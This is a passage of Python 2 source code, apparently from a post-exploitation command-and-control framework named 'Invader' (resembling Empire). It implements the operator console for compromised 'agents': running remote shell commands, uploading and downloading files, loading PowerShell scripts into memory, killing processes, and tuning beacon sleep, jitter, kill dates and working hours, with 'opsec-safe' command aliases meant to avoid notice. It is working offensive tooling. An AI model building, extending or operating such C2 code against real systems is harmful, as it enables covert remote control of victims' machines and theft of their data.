	    print helpers.color("[!] You must specify a resource file, show or clear. e.g. 'autorun /root/res.rc powershell' or 'autorun clear'")
	    return
	cmds = line.split(' ')
	resourceFile = cmds[0]
	language = None
        if len(cmds) > 1:
	    language = cmds[1].lower()
	elif not resourceFile == "show" and not resourceFile == "clear":
	    print helpers.color("[!] You must specify the agent language to run this module on. e.g. 'autorun /root/res.rc powershell' or 'autorun /root/res.rc python'")
	    return
	#show the current autorun settings by language or all
	if resourceFile == "show":
	    if language:
		if self.mainMenu.autoRuns.has_key(language):
		    print self.mainMenu.autoRuns[language]
		else:
		    print "No autorun commands for language %s" % language
	    else:
	        print self.mainMenu.autoRuns
	#clear autorun settings by language or all
	elif resourceFile == "clear":
	    if language and not language == "all":
		if self.mainMenu.autoRuns.has_key(language):
		    self.mainMenu.autoRuns.pop(language)
		else:
		    print "No autorun commands for language %s" % language
	    else:
		#clear all autoruns
		self.mainMenu.autoRuns.clear()
	#read in Invader commands from the specified resource file
	else:
	    self.mainMenu.autoRuns[language] = self.mainMenu.buildQueue(resourceFile, True)


    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            self.mainMenu.do_list("agents " + str(line))

    def do_rename(self, line):
        "Rename a particular agent."

        parts = line.strip().split(' ')

        # name sure we get an old name and new name for the agent
        if len(parts) == 2:
            # replace the old name with the new name
            self.mainMenu.agents.rename_agent(parts[0], parts[1])
        else:
            print helpers.color("[!] Please enter an agent name and new name")


    def do_interact(self, line):
        "Interact with a particular agent."

        name = line.strip()

        sessionID = self.mainMenu.agents.get_agent_id_db(name)

        if sessionID and sessionID != '' and sessionID in self.mainMenu.agents.agents:
            AgentMenu(self.mainMenu, sessionID)
        else:
            print helpers.color("[!] Please enter a valid agent name")


    def do_kill(self, line):
        "Task one or more agents to exit."

        name = line.strip()

        if name.lower() == 'all':
            try:
                choice = raw_input(helpers.color('[?] Kill all agents? [y/N] ', 'red'))
                if choice.lower() != '' and choice.lower()[0] == 'y':
                    allAgents = self.mainMenu.agents.get_agents_db()
                    for agent in allAgents:
                        sessionID = agent['session_id']
                        self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_EXIT')
            except KeyboardInterrupt:
                print ''

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(name)

            if sessionID and len(sessionID) != 0:
                try:
                    choice = raw_input(helpers.color("[?] Kill agent '%s'? [y/N] " % (name), 'red'))
                    if choice.lower() != '' and choice.lower()[0] == 'y':
                        self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_EXIT')
                except KeyboardInterrupt:
                    print ''
            else:
                print helpers.color("[!] Invalid agent name")

    def do_clear(self, line):
        "Clear one or more agent's taskings."

        name = line.strip()

        if name.lower() == 'all':
            self.mainMenu.agents.clear_agent_tasks_db('all')
        elif name.lower() == 'autorun':
            self.mainMenu.agents.clear_autoruns_db()
        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(name)

            if sessionID and len(sessionID) != 0:
                self.mainMenu.agents.clear_agent_tasks_db(sessionID)
            else:
                print helpers.color("[!] Invalid agent name")


    def do_sleep(self, line):
        "Task one or more agents to sleep."

        parts = line.strip().split(' ')

        if len(parts) == 1:
            print helpers.color("[!] Please enter 'interval [jitter]'")

        elif parts[0].lower() == 'all':
            delay = parts[1]
            jitter = 0.0
            if len(parts) == 3:
                jitter = parts[2]

            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:
                sessionID = agent['session_id']
                # update this agent info in the database
                self.mainMenu.agents.set_agent_field_db('delay', delay, sessionID)
                self.mainMenu.agents.set_agent_field_db('jitter', jitter, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', 'Set-Delay ' + str(delay) + ' ' + str(jitter))

                # dispatch this event
                message = "[*] Tasked agent to delay sleep/jitter {}/{}".format(delay, jitter)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                # update the agent log
                msg = "Tasked agent to delay sleep/jitter %s/%s" % (delay, jitter)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(parts[0])

            delay = parts[1]
            jitter = 0.0
            if len(parts) == 3:
                jitter = parts[2]

            if sessionID and len(sessionID) != 0:
                # update this agent's information in the database
                self.mainMenu.agents.set_agent_field_db('delay', delay, sessionID)
                self.mainMenu.agents.set_agent_field_db('jitter', jitter, sessionID)

                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', 'Set-Delay ' + str(delay) + ' ' + str(jitter))

                # dispatch this event
                message = "[*] Tasked agent to delay sleep/jitter {}/{}".format(delay, jitter)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                # update the agent log
                msg = "Tasked agent to delay sleep/jitter %s/%s" % (delay, jitter)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")


    def do_lostlimit(self, line):
        "Task one or more agents to lostlimit."

        parts = line.strip().split(' ')

        if len(parts) == 1:
            print helpers.color("[!] Usage: 'lostlimit [agent/all] [number of missed callbacks]")

        elif parts[0].lower() == 'all':
            lostLimit = parts[1]
            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:
                sessionID = agent['session_id']
                # update this agent info in the database
                self.mainMenu.agents.set_agent_field_db('lost_limit', lostLimit, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', 'Set-LostLimit ' + str(lostLimit))

                # dispatch this event
                message = "[*] Tasked agent to change lost limit {}".format(lostLimit)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                # update the agent log
                msg = "Tasked agent to change lost limit %s" % (lostLimit)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(parts[0])
            lostLimit = parts[1]

            if sessionID and len(sessionID) != 0:
                # update this agent's information in the database
                self.mainMenu.agents.set_agent_field_db('lost_limit', lostLimit, sessionID)

                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', 'Set-LostLimit ' + str(lostLimit))

                # dispatch this event
                message = "[*] Tasked agent to change lost limit {}".format(lostLimit)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                # update the agent log
                msg = "Tasked agent to change lost limit %s" % (lostLimit)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")


    def do_killdate(self, line):
        "Set the killdate for one or more agents."

        parts = line.strip().split(' ')

        if len(parts) == 1:
            print helpers.color("[!] Usage: 'killdate [agent/all] [01/01/2016]'")

        elif parts[0].lower() == 'all':
            date = parts[1]

            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:
                sessionID = agent['session_id']
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field_db('kill_date', date, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', "Set-KillDate " + str(date))

                # dispatch this event
                message = "[*] Tasked agent to set killdate to {}".format(date)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                # update the agent log
                msg = "Tasked agent to set killdate to " + str(date)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(parts[0])
            date = parts[1]

            if sessionID and len(sessionID) != 0:
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field_db('kill_date', date, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', "Set-KillDate " + str(date))

                # dispatch this event
                message = "[*] Tasked agent to set killdate to {}".format(date)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                # update the agent log
                msg = "Tasked agent to set killdate to " + str(date)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")


    def do_wkhours(self, line):
        "Set the working hours for one or more agents."

        parts = line.strip().split(' ')

        if len(parts) == 1:
            print helpers.color("[!] Usage: 'wkhours [agent/all] [9:00-17:00]'")

        elif parts[0].lower() == 'all':
            hours = parts[1]
            hours = hours.replace(',', '-')

            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:
                sessionID = agent['session_id']
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field_db('working_hours', hours, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', "Set-WorkingHours " + str(hours))

                # dispatch this event
                message = "[*] Tasked agent to set working hours to {}".format(hours)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                # update the agent log
                msg = "Tasked agent to set working hours to %s" % (hours)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(parts[0])

            hours = parts[1]
            hours = hours.replace(",", "-")

            if sessionID and len(sessionID) != 0:
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field_db('working_hours', hours, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', "Set-WorkingHours " + str(hours))

                # dispatch this event
                message = "[*] Tasked agent to set working hours to {}".format(hours)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                # update the agent log
                msg = "Tasked agent to set working hours to %s" % (hours)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")


    def do_remove(self, line):
        "Remove one or more agents from the database."

        name = line.strip()

        if name.lower() == 'all':
            try:
                choice = raw_input(helpers.color('[?] Remove all agents from the database? [y/N] ', 'red'))
                if choice.lower() != '' and choice.lower()[0] == 'y':
                    self.mainMenu.agents.remove_agent_db('%')
            except KeyboardInterrupt:
                print ''

        elif name.lower() == 'stale':
            # remove 'stale' agents that have missed their checkin intervals

            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:

                sessionID = agent['session_id']

                # max check in -> delay + delay*jitter
                intervalMax = (agent['delay'] + agent['delay'] * agent['jitter']) + 30

                # get the agent last check in time
                agentTime = time.mktime(time.strptime(agent['lastseen_time'], "%Y-%m-%d %H:%M:%S"))

                if agentTime < time.mktime(time.localtime()) - intervalMax:
                    # if the last checkin time exceeds the limit, remove it
                    self.mainMenu.agents.remove_agent_db(sessionID)


        elif name.isdigit():
            # if we're removing agents that checked in longer than X minutes ago
            allAgents = self.mainMenu.agents.get_agents_db()

            try:
                minutes = int(line.strip())

                # grab just the agents active within the specified window (in minutes)
                for agent in allAgents:

                    sessionID = agent['session_id']

                    # get the agent last check in time
                    agentTime = time.mktime(time.strptime(agent['lastseen_time'], "%Y-%m-%d %H:%M:%S"))

                    if agentTime < time.mktime(time.localtime()) - (int(minutes) * 60):
                        # if the last checkin time exceeds the limit, remove it
                        self.mainMenu.agents.remove_agent_db(sessionID)

            except:
                print helpers.color("[!] Please enter the minute window for agent checkin.")

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(name)

            if sessionID and len(sessionID) != 0:
                self.mainMenu.agents.remove_agent_db(sessionID)
            else:
                print helpers.color("[!] Invalid agent name")


    def do_payload(self, line):
        "Select an Invader payload."

        parts = line.split(' ')

        if parts[0] not in self.mainMenu.payloads.payloads:
            print helpers.color("[!] Error: invalid payload module")

        elif len(parts) == 1:
            payload_menu = payloadMenu(self.mainMenu, parts[0])
            payload_menu.cmdloop()
        elif len(parts) == 2:
            listener = parts[1]
            if not self.mainMenu.listeners.is_listener_valid(listener):
                print helpers.color("[!] Please enter a valid listener name or ID")
            else:
                self.mainMenu.payloads.set_payload_option('Listener', listener)
                payload_menu = payloadMenu(self.mainMenu, parts[0])
                payload_menu.cmdloop()
        else:
            print helpers.color("[!] Error in AgentsMenu's do_userpayload()")


    def do_use(self, line):
        "Use an Invader PowerShell module."

        # Strip asterisks added by MainMenu.complete_use()
        module = line.strip().rstrip("*")

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            # set agent to "all"
            module_menu = ModuleMenu(self.mainMenu, line, agent="all")
            module_menu.cmdloop()


    def do_search(self, line):
        "Search an Invader module (names/descriptions)."

        searchTerm = line.strip()

        if searchTerm.strip() == "":
            print helpers.color("[!] Please enter a search term.")
        else:
            self.mainMenu.modules.search_modules(searchTerm)


    def complete_interact(self, text, line, begidx, endidx):
        "Tab-complete an interact command."

        names = self.mainMenu.agents.get_agent_names_db()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


    def complete_rename(self, text, line, begidx, endidx):
        "Tab-complete a rename command."

        return self.complete_interact(text, line, begidx, endidx)


    def complete_clear(self, text, line, begidx, endidx):
        "Tab-complete a clear command."

        names = self.mainMenu.agents.get_agent_names_db() + ["all", "autorun"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


    def complete_remove(self, text, line, begidx, endidx):
        "Tab-complete a remove command."

        names = self.mainMenu.agents.get_agent_names_db() + ["all", "stale"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_list(self, text, line, begidx, endidx):
        "Tab-complete a list command."

        options = ["stale"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_kill(self, text, line, begidx, endidx):
        "Tab-complete a kill command."

        return self.complete_clear(text, line, begidx, endidx)


    def complete_sleep(self, text, line, begidx, endidx):
        "Tab-complete a sleep command."

        return self.complete_clear(text, line, begidx, endidx)


    def complete_lostlimit(self, text, line, begidx, endidx):
        "Tab-complete a lostlimit command."

        return self.complete_clear(text, line, begidx, endidx)


    def complete_killdate(self, text, line, begidx, endidx):
        "Tab-complete a killdate command."

        return self.complete_clear(text, line, begidx, endidx)


    def complete_wkhours(self, text, line, begidx, endidx):
        "Tab-complete a wkhours command."

        return self.complete_clear(text, line, begidx, endidx)


    def complete_use(self, text, line, begidx, endidx):
        "Tab-complete an Invader PowerShell module path."
        return self.mainMenu.complete_use(text, line, begidx, endidx)


    def complete_payload(self, text, line, begidx, endidx):
        "Tab-complete an Invader payload module path."
        return self.mainMenu.complete_payload(text, line, begidx, endidx)


    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."
        return self.mainMenu.complete_creds(text, line, begidx, endidx)


class AgentMenu(SubMenu):
    """
    An abstracted class used by Invader to determine which agent menu type
    to instantiate.
    """
    def __init__(self, mainMenu, sessionID):

        agentLanguage = mainMenu.agents.get_language_db(sessionID)

	if agentLanguage.lower() == 'powershell':
	    agent_menu = PowerShellAgentMenu(mainMenu, sessionID)
	    agent_menu.cmdloop()
	elif agentLanguage.lower() == 'python':
	    agent_menu = PythonAgentMenu(mainMenu, sessionID)
	    agent_menu.cmdloop()
	else:
	    print helpers.color("[!] Agent language %s not recognized." % (agentLanguage))


class PowerShellAgentMenu(SubMenu):
    """
    The main class used by Invader to drive an individual 'agent' menu.
    """
    def __init__(self, mainMenu, sessionID):

        SubMenu.__init__(self, mainMenu)

        self.sessionID = sessionID
        self.doc_header = 'Agent Commands'
        dispatcher.connect(self.handle_agent_event, sender=dispatcher.Any)

        # try to resolve the sessionID to a name
        name = self.mainMenu.agents.get_agent_name_db(sessionID)

        # set the text prompt
        self.prompt = '(Invader: ' + helpers.color(name, 'red') + ')> '

        # agent commands that have opsec-safe alises in the agent code
        self.agentCommands = ['ls', 'dir', 'rm', 'del', 'cp', 'copy', 'pwd', 'cat', 'cd', 'mkdir', 'rmdir', 'mv', 'move', 'ipconfig', 'ifconfig', 'route', 'reboot', 'restart', 'shutdown', 'ps', 'tasklist', 'getpid', 'whoami', 'getuid', 'hostname']

        # display any results from the database that were stored
        # while we weren't interacting with the agent
        results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
        if results:
            print "\n" + results.rstrip('\r\n')

    # def preloop(self):
    #     traceback.print_stack()

    def handle_agent_event(self, signal, sender):
        """
        Handle agent event signals
        """
        # load up the signal so we can inspect it
        try:
            signal_data = json.loads(signal)
        except ValueError:
            print(helpers.color("[!] Error: bad signal recieved {} from sender {}".format(signal, sender)))
            return

        if '{} returned results'.format(self.sessionID) in signal:
            results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
            if results:
                print(helpers.color(results))


    def default(self, line):
        "Default handler."

        line = line.strip()
        parts = line.split(' ')

        if len(parts) > 0:
            # check if we got an agent command
            if parts[0] in self.agentCommands:
                shellcmd = ' '.join(parts)
                # task the agent with this shell command
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", shellcmd)

                # dispatch this event
                message = "[*] Tasked agent to run command {}".format(line)
                signal = json.dumps({
                    'print': False,
                    'message': message,
                    'command': line
                })
                dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

                # update the agent log
                msg = "Tasked agent to run command " + line
                self.mainMenu.agents.save_agent_log(self.sessionID, msg)
            else:
                print helpers.color("[!] Command not recognized.")
                print helpers.color("[*] Use 'help' or 'help agentcmds' to see available commands.")

    def do_help(self, *args):
        "Displays the help menu or syntax for particular commands."

        if args[0].lower() == "agentcmds":
            print "\n" + helpers.color("[*] Available opsec-safe agent commands:\n")
            print "     " + messages.wrap_columns(", ".join(self.agentCommands), ' ', width1=50, width2=10, indent=5) + "\n"
        else:
            SubMenu.do_help(self, *args)

    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")

    def do_rename(self, line):
        "Rename the agent."

        parts = line.strip().split(' ')
        oldname = self.mainMenu.agents.get_agent_name_db(self.sessionID)

        # name sure we get a new name to rename this agent
        if len(parts) == 1 and parts[0].strip() != '':
            # replace the old name with the new name
            result = self.mainMenu.agents.rename_agent(oldname, parts[0])
            if result:
                self.prompt = "(Invader: " + helpers.color(parts[0], 'red') + ")> "
        else:
            print helpers.color("[!] Please enter a new name for the agent")

    def do_info(self, line):
        "Display information about this agent."

        # get the agent name, if applicable
        agent = self.mainMenu.agents.get_agent_db(self.sessionID)
        messages.display_agent(agent)

    def do_exit(self, line):
        "Task agent to exit."

        try:
            choice = raw_input(helpers.color("[?] Task agent to exit? [y/N] ", "red"))
            if choice.lower() == "y":

                self.mainMenu.agents.add_agent_task_db(self.sessionID, 'TASK_EXIT')

                # dispatch this event
                message = "[*] Tasked agent to exit"
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to exit")
                raise NavAgents

        except KeyboardInterrupt:
            print ""


    def do_clear(self, line):
        "Clear out agent tasking."
        self.mainMenu.agents.clear_agent_tasks_db(self.sessionID)


    def do_jobs(self, line):
        "Return jobs or kill a running job."

        parts = line.split(' ')

        if len(parts) == 1:
            if parts[0] == '':
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_GETJOBS")

                # dispatch this event
                message = "[*] Tasked agent to get running jobs"
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get running jobs")
            else:
                print helpers.color("[!] Please use form 'jobs kill JOB_ID'")
        elif len(parts) == 2:
            jobID = parts[1].strip()
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_STOPJOB", jobID)

            # dispatch this event
            message = "[*] Tasked agent to stop job {}".format(jobID)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to stop job " + str(jobID))

    def do_sleep(self, line):
        "Task an agent to sleep."

        parts = line.strip().split(' ')

        if len(parts) > 0 and parts[0] != "":
            delay = parts[0]
            jitter = 0.0
            if len(parts) == 2:
                jitter = parts[1]

            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("delay", delay, self.sessionID)
            self.mainMenu.agents.set_agent_field_db("jitter", jitter, self.sessionID)

            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Set-Delay " + str(delay) + ' ' + str(jitter))

            # dispatch this event
            message = "[*] Tasked agent to delay sleep/jitter {}/{}".format(delay, jitter)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to delay sleep/jitter " + str(delay) + "/" + str(jitter)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_lostlimit(self, line):
        "Task an agent to change the limit on lost agent detection."

        parts = line.strip().split(' ')
        if len(parts) > 0 and parts[0] != "":
            lostLimit = parts[0]

        # update this agent's information in the database
        self.mainMenu.agents.set_agent_field_db("lost_limit", lostLimit, self.sessionID)
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Set-LostLimit " + str(lostLimit))

        # dispatch this event
        message = "[*] Tasked agent to change lost limit {}".format(lostLimit)
        signal = json.dumps({
            'print': False,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

        # update the agent log
        msg = "Tasked agent to change lost limit " + str(lostLimit)
        self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_kill(self, line):
        "Task an agent to kill a particular process name or ID."

        parts = line.strip().split(' ')
        process = parts[0]

        if process == "":
            print helpers.color("[!] Please enter a process name or ID.")
        else:
            # if we were passed a process ID
            if process.isdigit():
                command = "Stop-Process " + str(process) + " -Force"
            else:
                # otherwise assume we were passed a process name
                # so grab all processes by this name and kill them
                command = "Get-Process " + str(process) + " | %{Stop-Process $_.Id -Force}"

            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", command)

            # dispatch this event
            message = "[*] Tasked agent to kill process {}".format(process)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            msg = "Tasked agent to kill process: " + str(process)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_killdate(self, line):
        "Get or set an agent's killdate (01/01/2016)."

        parts = line.strip().split(' ')
        date = parts[0]

        if date == "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Get-KillDate")

            # dispatch this event
            message = "[*] Tasked agent to get KillDate"
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get KillDate")

        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("kill_date", date, self.sessionID)

            # task the agent
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Set-KillDate " + str(date))

            # dispatch this event
            message = "[*] Tasked agent to set KillDate to {}".format(date)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to set killdate to " + str(date)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_wkhours(self, line):
        "Get or set an agent's working hours (9:00-17:00)."

        parts = line.strip().split(' ')
        hours = parts[0]

        if hours == "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Get-WorkingHours")

            # dispatch this event
            message = "[*] Tasked agent to get working hours"
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get working hours")

        else:
            hours = hours.replace(",", "-")
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("working_hours", hours, self.sessionID)

            # task the agent
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Set-WorkingHours " + str(hours))

            # dispatch this event
            message = "[*] Tasked agent to set working hours to {}".format(hours)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to set working hours to " + str(hours)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_shell(self, line):
        "Task an agent to execute a shell command."

        line = line.strip()

        if line != "":
            # task the agent with this shell command
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "shell " + str(line))

            # dispatch this event
            message = "[*] Tasked agent to run shell command {}".format(line)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to run shell command " + line
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_sysinfo(self, line):
        "Task an agent to get system information."

        # task the agent with this shell command
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SYSINFO")

        # dispatch this event
        message = "[*] Tasked agent to get system information"
        signal = json.dumps({
            'print': False,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

        # update the agent log
        self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get system information")


    def do_download(self, line):
        "Task an agent to download a file."

        line = line.strip()

        if line != "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_DOWNLOAD", line)

            # dispatch this event
            message = "[*] Tasked agent to get system information"
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to download " + line
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_upload(self, line):
        "Task an agent to upload a file."

        # "upload /path/file.ext" or "upload /path/file/file.ext newfile.ext"
        # absolute paths accepted
        parts = line.strip().split(' ')
        uploadname = ""

        if len(parts) > 0 and parts[0] != "":
            if len(parts) == 1:
                # if we're uploading the file with its original name
                uploadname = os.path.basename(parts[0])
            else:
                # if we're uploading the file as a different name
                uploadname = parts[1].strip()

            if parts[0] != "" and os.path.exists(parts[0]):
                # Check the file size against the upload limit of 1 mb

                # read in the file and base64 encode it for transport
                open_file = open(parts[0], 'r')
                file_data = open_file.read()
                open_file.close()

                size = os.path.getsize(parts[0])
                if size > 1048576:
                    print helpers.color("[!] File size is too large. Upload limit is 1MB.")
                else:
                    # dispatch this event
                    message = "[*] Tasked agent to upload {}, {}".format(uploadname, helpers.get_file_size(file_data))
                    signal = json.dumps({
                        'print': True,
                        'message': message,
                        'file_name': uploadname,
                        'file_md5': hashlib.md5(file_data).hexdigest(),
                        'file_size': helpers.get_file_size(file_data)
                    })
                    dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

                    # update the agent log
                    msg = "Tasked agent to upload %s : %s" % (parts[0], hashlib.md5(file_data).hexdigest())
                    self.mainMenu.agents.save_agent_log(self.sessionID, msg)

                    # upload packets -> "filename | script data"
                    file_data = helpers.encode_base64(file_data)
                    data = uploadname + "|" + file_data
                    self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_UPLOAD", data)
            else:
                print helpers.color("[!] Please enter a valid file path to upload")


    def do_sci(self, line):
        "Imports a PowerShell script and keeps it in memory in the agent."

        path = line.strip()

        if path != "" and os.path.exists(path):
            open_file = open(path, 'r')
            script_data = open_file.read()
            open_file.close()

            # strip out comments and blank lines from the imported script
            script_data = helpers.strip_powershell_comments(script_data)

            # task the agent to important the script
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SCRIPT_IMPORT", script_data)

            # dispatch this event
            message = "[*] Tasked agent to import {}: {}".format(path, hashlib.md5(script_data).hexdigest())
            signal = json.dumps({
                'print': False,
                'message': message,
                'import_path': path,
                'import_md5': hashlib.md5(script_data).hexdigest()
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log with the filename and MD5
            msg = "Tasked agent to import %s : %s" % (path, hashlib.md5(script_data).hexdigest())
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

            # extract the functions from the script so we can tab-complete them
            functions = helpers.parse_powershell_script(script_data)

            # set this agent's tab-completable functions
            self.mainMenu.agents.set_agent_functions_db(self.sessionID, functions)

        else:
            print helpers.color("[!] Please enter a valid script path")


    def do_scmd(self, line):
        "Execute a function in the currently imported PowerShell script."

        command = line.strip()

        if command != "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SCRIPT_COMMAND", command)

            # dispatch this event
            message = "[*] Tasked agent {} to run {}".format(self.sessionID, command)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            msg = "[*] Tasked agent %s to run %s" % (self.sessionID, command)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


